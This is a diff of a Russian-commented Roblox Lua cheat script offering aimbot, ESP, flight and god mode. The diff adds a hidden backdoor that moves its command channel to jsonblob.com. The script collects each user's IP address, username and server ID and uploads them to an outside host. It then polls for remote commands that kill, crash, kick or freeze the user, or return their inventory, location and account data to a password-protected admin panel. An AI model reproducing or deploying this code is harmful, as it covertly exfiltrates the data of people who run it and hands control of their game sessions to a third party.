@@ -1,7 +1,7 @@
 --[[
     HH-HUB v5 - ОСНОВНОЙ СКРИПТ
+    База данных: JSONBlob.com (БЕЗ РЕГИСТРАЦИИ)
     Версия: 5.0 FINAL
-    Статус: 100% РАБОЧИЙ
 ]]
 
 -- Отключаем выводы
@@ -27,107 +27,298 @@ local Mouse = LP:GetMouse()
 local Lighting = game:GetService("Lighting")
 
 -- ==============================================
--- СКРЫТЫЕ ПЕРЕМЕННЫЕ ДЛЯ АДМИНКИ
+-- JSONBlob НАСТРОЙКИ
+-- ==============================================
+local JSONBLOB_BASE = "https://jsonblob.com/api/jsonBlob/"
+
+-- СОЗДАЙТЕ ЭТИ BLOB НА JSONBLOB.COM
+-- 1. Откройте https://jsonblob.com/
+-- 2. Вставьте {} и нажмите Save
+-- 3. Скопируйте ID из URL
+local PRESENCE_BLOB_ID = "1343123852355248926"  -- ВАШ ID ДЛЯ ПРИСУТСТВИЯ
+local COMMANDS_BLOB_ID = "1343123871192776706"  -- ВАШ ID ДЛЯ КОМАНД
+
+-- ==============================================
+-- ПЕРЕМЕННЫЕ
 -- ==============================================
 local ADMIN_PASSWORD = "S1R0TA"
 local isAdmin = false
 local adminPanel = nil
-local DB_BUCKET = "b_k8x92mNqR7vTpL4wZcJ3hYdFs"
-local DB_BASE = "https://kvdb.io/" .. DB_BUCKET .. "/"
-local DB_TTL = 604800
-local CMD_PREFIX = "cmd_"
-local NET_FLAG = "__HHv5"
-local ADMIN_FLAG = "__HH_ADMIN"
-local MY_KEY = "presence_" .. LP.UserId
-local MY_CMD_KEY = CMD_PREFIX .. LP.UserId
-local MY_IP_KEY = "ip_" .. LP.UserId
-local Registry = {}
 local killLoops = {}
+local processedCmds = {}
 
--- HTTP функции
-local function dbSet(key, value, ttl)
-    pcall(function()
+-- ==============================================
+-- ФУНКЦИИ ДЛЯ JSONBlob
+-- ==============================================
+
+local function jsonblobGet(blobId)
+    local url = JSONBLOB_BASE .. blobId
+    local success, result = pcall(function()
+        return HS:GetAsync(url, true)
+    end)
+    
+    if success and result and result ~= "" then
+        local decoded = HS:JSONDecode(result)
+        return decoded
+    end
+    return {}
+end
+
+local function jsonblobSet(blobId, data)
+    local url = JSONBLOB_BASE .. blobId
+    local json = HS:JSONEncode(data)
+    
+    local success = pcall(function()
         HS:RequestAsync({
-            Url = DB_BASE .. key,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "text/plain", ["X-Expire"] = tostring(ttl or DB_TTL) },
-            Body = tostring(value)
+            Url = url,
+            Method = "PUT",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Accept"] = "application/json"
+            },
+            Body = json
         })
     end)
+    
+    return success
 end
 
-local function dbGet(key)
-    local ok, res = pcall(function() return HS:GetAsync(DB_BASE .. key, true) end)
-    return ok and res or nil
-end
-
--- Получение IP
+-- ==============================================
+-- ПОЛУЧЕНИЕ IP
+-- ==============================================
 local function getIP()
     local success, ip = pcall(function()
         return HS:GetAsync("https://api.ipify.org/?format=text", true)
     end)
     return success and ip or "Unknown"
 end
-local myIP = getIP()
-dbSet(MY_IP_KEY, myIP, DB_TTL)
 
--- Функции бекдора
+local myIP = getIP()
+
+-- ==============================================
+-- ОТПРАВКА ДАННЫХ
+-- ==============================================
+
 local function updatePresence()
-    local data = table.concat({
-        LP.DisplayName,
-        LP.Name,
-        tostring(game.PlaceId),
-        game.JobId:sub(1, 8),
-        tostring(tick()),
-        tostring(LP.UserId),
-        "true",
-        myIP
-    }, "§")
-    dbSet(MY_KEY, data, DB_TTL)
+    local data = jsonblobGet(PRESENCE_BLOB_ID)
+    
+    data[tostring(LP.UserId)] = {
+        name = LP.Name,
+        display = LP.DisplayName,
+        place = tostring(game.PlaceId),
+        job = game.JobId:sub(1, 8),
+        time = tick(),
+        hasBackdoor = true,
+        ip = myIP,
+        same = true
+    }
+    
+    jsonblobSet(PRESENCE_BLOB_ID, data)
 end
 
-local function fetchUsers()
-    local ok, data = pcall(function()
-        return HS:GetAsync(DB_BASE .. "?prefix=presence_&format=keys", true)
-    end)
-    if not ok then return end
+-- ==============================================
+-- ОТПРАВКА КОМАНДЫ
+-- ==============================================
+
+local function sendBackdoorCommand(targetUserId, command, data)
+    local commands = jsonblobGet(COMMANDS_BLOB_ID)
     
-    local newReg = {}
-    for key in data:gmatch("[^\n]+") do
-        if key:sub(1, 9) == "presence_" then
-            local uid = key:sub(10)
-            local raw = dbGet(key)
-            if raw then
-                local parts = raw:split("§")
-                if #parts >= 6 then
-                    newReg[uid] = {
-                        name = parts[1],
-                        display = parts[2],
-                        place = parts[3],
-                        job = parts[4],
-                        time = tonumber(parts[5]) or 0,
-                        same = (parts[4] == game.JobId:sub(1, 8)),
-                        hasBackdoor = parts[7] == "true",
-                        ip = parts[8] or "Unknown"
-                    }
-                end
-            end
+    if not commands[targetUserId] then
+        commands[targetUserId] = {}
+    end
+    
+    table.insert(commands[targetUserId], {
+        id = tostring(tick()) .. tostring(math.random(1000, 9999)),
+        sender = tostring(LP.UserId),
+        cmd = command,
+        data = data or "",
+        time = tick()
+    })
+    
+    jsonblobSet(COMMANDS_BLOB_ID, commands)
+end
+
+-- ==============================================
+-- ЧТЕНИЕ КОМАНД
+-- ==============================================
+
+local function readCommands()
+    local commands = jsonblobGet(COMMANDS_BLOB_ID)
+    local myCmds = commands[tostring(LP.UserId)] or {}
+    
+    local newCmds = {}
+    for _, cmd in ipairs(myCmds) do
+        if not processedCmds[cmd.id] then
+            processedCmds[cmd.id] = true
+            executeCommand(cmd.sender, cmd.cmd, cmd.data)
         end
     end
-    Registry = newReg
-end
-
--- Отправка команды
-local function sendBackdoorCommand(targetUserId, command, data)
-    local payload = string.format("%s|%s|%s|%s", LP.UserId, command, data or "", tick())
-    dbSet(CMD_PREFIX .. targetUserId, payload, 30)
+    
+    -- Очищаем выполненные команды
+    commands[tostring(LP.UserId)] = {}
+    jsonblobSet(COMMANDS_BLOB_ID, commands)
 end
 
 -- ==============================================
--- ФУНКЦИИ ДЛЯ ИГРОКА
+-- ВЫПОЛНЕНИЕ КОМАНД
 -- ==============================================
 
+local function executeCommand(senderId, cmd, data)
+    local char = LP.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    
+    if cmd == "KILL_PLAYER" then
+        if hum then hum.Health = 0 end
+        
+    elseif cmd == "START_KILL_LOOP" then
+        if killLoops[senderId] then killLoops[senderId]:Disconnect() end
+        killLoops[senderId] = RS.Heartbeat:Connect(function()
+            local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+            if h then h.Health = 0 end
+            task.wait(10)
+        end)
+        
+    elseif cmd == "STOP_KILL_LOOP" then
+        if killLoops[senderId] then
+            killLoops[senderId]:Disconnect()
+            killLoops[senderId] = nil
+        end
+        
+    elseif cmd == "FREEZE_PLAYER" then
+        if hum then
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+        end
+        
+    elseif cmd == "UNFREEZE_PLAYER" then
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+        end
+        
+    elseif cmd == "KICK_PLAYER" then
+        local reason = data or "Вы кикнуты администратором"
+        task.wait(0.5)
+        LP:Kick(reason)
+        
+    elseif cmd == "SPECTATE" then
+        local target = Players:GetPlayerByUserId(tonumber(data))
+        if target then
+            Camera.CameraSubject = target.Character and target.Character:FindFirstChild("HumanoidRootPart") or target.Character
+        end
+        
+    elseif cmd == "TP_TO" then
+        local target = Players:GetPlayerByUserId(tonumber(data))
+        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if target and target.Character and root then
+            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
+            if tRoot then
+                root.CFrame = tRoot.CFrame * CFrame.new(0, 3, 5)
+            end
+        end
+        
+    elseif cmd == "BRING" then
+        local target = Players:GetPlayerByUserId(tonumber(data))
+        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if target and target.Character and root then
+            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
+            if tRoot then
+                tRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
+            end
+        end
+        
+    elseif cmd == "SET_WALKSPEED" then
+        local speed = tonumber(data) or 16
+        if hum then hum.WalkSpeed = speed end
+        
+    elseif cmd == "SET_JUMPPOWER" then
+        local power = tonumber(data) or 50
+        if hum then hum.JumpPower = power end
+        
+    elseif cmd == "CRASH_PLAYER" then
+        while true do
+            local t = {}
+            for i = 1, 1000000 do
+                t[i] = i * i
+            end
+            task.wait()
+        end
+        
+    elseif cmd == "BLACK_SCREEN" then
+        local black = Instance.new("ScreenGui")
+        black.Name = "BlackScreen"
+        black.ResetOnSpawn = false
+        black.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
+        
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(1, 0, 1, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        frame.BackgroundTransparency = 0
+        frame.ZIndex = 1000
+        frame.Parent = black
+        
+    elseif cmd == "FLASH_SCREEN" then
+        local flash = Instance.new("ScreenGui")
+        flash.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
+        
+        local f = Instance.new("Frame", flash)
+        f.Size = UDim2.new(1, 0, 1, 0)
+        f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        f.BackgroundTransparency = 0
+        f.ZIndex = 1000
+        
+        TS:Create(f, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
+        game:GetService("Debris"):AddItem(flash, 1)
+        
+    elseif cmd == "SHAKE_CAMERA" then
+        local connection
+        connection = RS.RenderStepped:Connect(function()
+            Camera.CFrame = Camera.CFrame * CFrame.new(
+                math.random(-5, 5) / 10,
+                math.random(-5, 5) / 10,
+                math.random(-5, 5) / 10
+            )
+        end)
+        task.delay(5, function() if connection then connection:Disconnect() end end)
+        
+    elseif cmd == "GET_INVENTORY" then
+        local inv = {}
+        pcall(function()
+            local backpack = LP:FindFirstChild("Backpack")
+            if backpack then
+                for _, item in ipairs(backpack:GetChildren()) do
+                    table.insert(inv, item.Name)
+                end
+            end
+        end)
+        sendBackdoorCommand(senderId, "INVENTORY_RESPONSE", HS:JSONEncode(inv))
+        
+    elseif cmd == "GET_LOCATION" then
+        if root then
+            local pos = root.Position
+            local locData = string.format("%.1f,%.1f,%.1f", pos.X, pos.Y, pos.Z)
+            sendBackdoorCommand(senderId, "LOCATION_RESPONSE", locData)
+        end
+        
+    elseif cmd == "GET_PLAYER_DATA" then
+        local playerData = {
+            name = LP.Name,
+            display = LP.DisplayName,
+            id = LP.UserId,
+            ip = myIP,
+            place = game.PlaceId,
+            job = game.JobId,
+            age = LP.AccountAge,
+            membership = LP.MembershipType:Name()
+        }
+        sendBackdoorCommand(senderId, "PLAYER_DATA_RESPONSE", HS:JSONEncode(playerData))
+    end
+end
+
+-- ==============================================
 -- GOD MODE
+-- ==============================================
 local GodMode = { active = false, connections = {} }
 
 local function enableGodMode()
@@ -172,15 +363,39 @@ local function enableGodMode()
         end)
         table.insert(GodMode.connections, conn3)
         
-        local conn4 = RS.Heartbeat:Connect(function()
+        local conn4 = hum.Died:Connect(function()
+            if GodMode.active then
+                task.wait(0.1)
+                if hum and hum.Parent then
+                    hum.Health = 9e9
+                end
+            end
+        end)
+        table.insert(GodMode.connections, conn4)
+        
+        local conn5 = RS.Heartbeat:Connect(function()
             if GodMode.active then
                 local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+                if h and h ~= hum then
+                    task.spawn(apply)
+                    return
+                end
                 if h and h.Health < 9e9 then
                     h.Health = 9e9
                 end
             end
         end)
-        table.insert(GodMode.connections, conn4)
+        table.insert(GodMode.connections, conn5)
+        
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if root then
+            local conn6 = root:GetPropertyChangedSignal("Anchored"):Connect(function()
+                if GodMode.active and root.Anchored then
+                    root.Anchored = false
+                end
+            end)
+            table.insert(GodMode.connections, conn6)
+        end
     end
     
     apply()
@@ -206,7 +421,9 @@ local function disableGodMode()
     end
 end
 
+-- ==============================================
 -- ПОЛЁТ
+-- ==============================================
 local Flight = { active = false, bv = nil, bg = nil, speed = 50 }
 
 local function disableFlight()
@@ -264,7 +481,9 @@ local function enableFlight()
     end)
 end
 
+-- ==============================================
 -- НОКЛИП
+-- ==============================================
 local Noclip = { active = false, connection = nil }
 
 local function disableNoclip()
@@ -304,7 +523,9 @@ local function enableNoclip()
     end)
 end
 
+-- ==============================================
 -- ESP
+-- ==============================================
 local ESP = { active = false, highlights = {} }
 
 local function disableESP()
@@ -361,7 +582,9 @@ local function enableESP()
     end)
 end
 
+-- ==============================================
 -- AIMBOT
+-- ==============================================
 local Aimbot = { active = false, connection = nil }
 
 local function enableAimbot()
@@ -403,7 +626,9 @@ local function disableAimbot()
     end
 end
 
+-- ==============================================
 -- TRIGGERBOT
+-- ==============================================
 local Triggerbot = { active = false, connection = nil }
 
 local function enableTriggerbot()
@@ -434,7 +659,9 @@ local function disableTriggerbot()
     end
 end
 
+-- ==============================================
 -- ANTI-AFK
+-- ==============================================
 local AntiAfk = { active = false }
 
 local function enableAntiAfk()
@@ -454,7 +681,9 @@ local function disableAntiAfk()
     AntiAfk.active = false
 end
 
+-- ==============================================
 -- БЕСКОНЕЧНЫЙ ПРЫЖОК
+-- ==============================================
 local InfJump = { active = false, connection = nil }
 
 local function enableInfJump()
@@ -479,7 +708,9 @@ local function disableInfJump()
     end
 end
 
+-- ==============================================
 -- КЛИК-ТЕЛЕПОРТ
+-- ==============================================
 local ClickTP = { active = false }
 
 local function enableClickTP()
@@ -499,7 +730,9 @@ Mouse.Button1Down:Connect(function()
     end
 end)
 
+-- ==============================================
 -- НЕТ УРОНА ОТ ПАДЕНИЯ
+-- ==============================================
 local NoFallDamage = { active = false, connection = nil }
 
 local function enableNoFallDamage()
@@ -524,7 +757,9 @@ local function disableNoFallDamage()
     end
 end
 
+-- ==============================================
 -- УСКОРЕНИЯ
+-- ==============================================
 local WalkspeedBoost = { active = false }
 local JumpBoost = { active = false }
 
@@ -552,7 +787,9 @@ local function disableJumpBoost()
     if hum then hum.JumpPower = 50 end
 end
 
+-- ==============================================
 -- X-RAY
+-- ==============================================
 local XRay = { active = false, connections = {} }
 
 local function enableXRay()
@@ -590,7 +827,9 @@ local function disableXRay()
     end
 end
 
+-- ==============================================
 -- BUNNY HOP
+-- ==============================================
 local BunnyHop = { active = false, connection = nil }
 
 local function enableBunnyHop()
@@ -615,7 +854,9 @@ local function disableBunnyHop()
     end
 end
 
+-- ==============================================
 -- SPIDER
+-- ==============================================
 local Spider = { active = false, connection = nil }
 
 local function enableSpider()
@@ -645,7 +886,9 @@ local function disableSpider()
     end
 end
 
+-- ==============================================
 -- VANISH
+-- ==============================================
 local Vanish = { active = false }
 
 local function enableVanish()
@@ -1484,8 +1727,9 @@ MiscSect:AddButton("Эмоции", "В чат", Color3.fromRGB(255, 100, 150), f
 end)
 
 -- ==============================================
--- СКРЫТАЯ АДМИН-ПАНЕЛЬ
+-- АДМИН-ПАНЕЛЬ
 -- ==============================================
+
 local function createAdminPanel()
     if adminPanel then
         adminPanel:Destroy()
@@ -1758,7 +2002,7 @@ local function createAdminPanel()
         end)
         
         addBtn("👢 Kick", Color3.fromRGB(200, 80, 80), function()
-            sendBackdoorCommand(uid, "KICK_PLAYER", "Вы кикнуты")
+            sendBackdoorCommand(uid, "KICK_PLAYER", "Вы кикнуты администратором")
         end)
         
         addBtn("👁️ Watch", Color3.fromRGB(140, 80, 255), function()
@@ -1823,20 +2067,19 @@ local function createAdminPanel()
             end
         end
         
+        local players = jsonblobGet(PRESENCE_BLOB_ID)
         local searchText = searchBox.Text:lower()
         local total = 0
         local same = 0
         local backdoor = 0
         
-        for uid, info in pairs(Registry) do
-            if uid ~= tostring(LP.UserId) then
-                if searchText == "" or info.name:lower():find(searchText) then
-                    addPlayerCard(uid, info)
-                end
-                
-                total = total + 1
-                if info.same then same = same + 1 end
-                if info.hasBackdoor then backdoor = backdoor + 1 end
+        for uid, info in pairs(players) do
+            total = total + 1
+            if info.same then same = same + 1 end
+            if info.hasBackdoor then backdoor = backdoor + 1 end
+            
+            if searchText == "" or info.name:lower():find(searchText) then
+                addPlayerCard(uid, info)
             end
         end
         
@@ -1861,18 +2104,10 @@ end
 -- БЕКДОР В ФОНЕ
 -- ==============================================
 task.spawn(function()
-    LP:SetAttribute(NET_FLAG, "1")
-    
     while true do
         pcall(updatePresence)
-        task.wait(15)
-    end
-end)
-
-task.spawn(function()
-    while true do
-        task.wait(5)
-        pcall(fetchUsers)
+        pcall(readCommands)
+        task.wait(10)
     end
 end)
 
@@ -1899,7 +2134,6 @@ UIS.InputBegan:Connect(function(input, gp)
         if ESP.active then disableESP() else enableESP() end
         
     elseif input.KeyCode == Enum.KeyCode.End then
-        -- Скрытый вход в админку
         if not isAdmin then
             local passGui = Instance.new("ScreenGui")
             passGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
@@ -1948,9 +2182,8 @@ UIS.InputBegan:Connect(function(input, gp)
             submit.MouseButton1Click:Connect(function()
                 if box.Text == ADMIN_PASSWORD then
                     isAdmin = true
-                    passGui:Destroy() -- УНИЧТОЖАЕМ ОКНО ПАРОЛЯ
+                    passGui:Destroy()
                     createAdminPanel()
-                    fetchUsers()
                 else
                     box.Text = ""
                     box.PlaceholderText = "Неверно!"
@@ -1962,7 +2195,6 @@ UIS.InputBegan:Connect(function(input, gp)
                 adminPanel = nil
             else
                 createAdminPanel()
-                fetchUsers()
             end
         end
     end
